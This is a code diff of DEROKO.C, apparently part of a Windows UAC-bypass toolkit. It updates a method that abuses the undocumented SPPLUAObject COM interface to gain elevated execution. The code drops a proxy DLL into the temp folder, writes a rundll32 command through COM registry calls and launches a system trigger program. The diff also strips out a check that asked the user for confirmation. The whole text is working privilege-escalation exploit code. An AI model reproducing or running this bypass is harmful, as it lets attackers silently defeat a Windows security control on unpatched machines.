@@ -4,9 +4,9 @@
 *
 *  TITLE:       DEROKO.C
 *
-*  VERSION:     3.00
+*  VERSION:     3.11
 *
-*  DATE:        25 Aug 2018
+*  DATE:        23 Nov 2018
 *
 *  Deroko UAC bypass using SPPLUAObject (Software Licensing).
 *  Origin https://github.com/deroko/SPPLUAObjectUacBypass
@@ -55,7 +55,7 @@ HRESULT ucmSPLUAObjectRegSetValue(
             bsRegistryValue = SysAllocString(ValueName);
             if (bsRegistryValue) {
 
-                if (g_ctx.dwBuildNumber < 9200) {
+                if (g_ctx->dwBuildNumber < 9200) {
                     r = pInterfaceObjectWin7->lpVtbl->SLLUARegKeySetValue(
                         pInterfaceObjectWin7,
                         RegType,
@@ -91,13 +91,15 @@ HRESULT ucmSPLUAObjectRegSetValue(
 * Bypass UAC using SPPLUAObject undocumented COM interface.
 * This function expects that supMasqueradeProcess was called on process initialization.
 *
+* Fixed in Windows 10 RS5.
+*
 */
 BOOL ucmSPPLUAObjectMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL      bResult = FALSE, bCond = FALSE, bApprove = FALSE;
+    BOOL      bResult = FALSE, bCond = FALSE;
     HRESULT   r = E_FAIL, hr_init;
     ISLLUACOM *SPPLUAObject = NULL;
 
@@ -114,18 +116,9 @@ BOOL ucmSPPLUAObjectMethod(
     do {
 
         //
-        // Potential fix check.
-        //
-        if (supIsConsentApprovedInterface(T_CLSID_SPPLUAObject, &bApprove)) {
-            if (bApprove == FALSE)
-                if (ucmShowQuestion(UACFIX) != IDYES)
-                    break;
-        }
-
-        //
         // Drop Fubuki to the %temp% as OskSupport.dll
         //
-        _strcpy(szBuffer, g_ctx.szTempDirectory);
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
         _strcat(szBuffer, OSKSUPPORT_DLL);
         if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
             break;
@@ -147,15 +140,15 @@ BOOL ucmSPPLUAObjectMethod(
         //
         // Build rundll32 command.
         //
-        memIO = (2 + _strlen(g_ctx.szSystemDirectory)\
+        memIO = (2 + _strlen(g_ctx->szSystemDirectory)\
             + _strlen(szBuffer)\
             + _strlen(RUNDLL_EXE_CMD)\
             + _strlen(FUBUKI_DEFAULT_ENTRYPOINTW)) * sizeof(WCHAR);
 
-        lpszCommandLine = supHeapAlloc(memIO);
+        lpszCommandLine = (LPWSTR)supHeapAlloc(memIO);
         if (lpszCommandLine) {
 
-            _strcpy(lpszCommandLine, g_ctx.szSystemDirectory);
+            _strcpy(lpszCommandLine, g_ctx->szSystemDirectory);
             _strcat(lpszCommandLine, RUNDLL_EXE_CMD);
             _strcat(lpszCommandLine, szBuffer);
             _strcat(lpszCommandLine, TEXT(","));
@@ -212,7 +205,7 @@ BOOL ucmSPPLUAObjectMethod(
                         //
                         // Launch trigger app.
                         //
-                        _strcpy(szBuffer, g_ctx.szSystemDirectory);
+                        _strcpy(szBuffer, g_ctx->szSystemDirectory);
                         _strcat(szBuffer, RRINSTALLER_EXE);
                         bResult = supRunProcess(szBuffer, NULL);
                     }
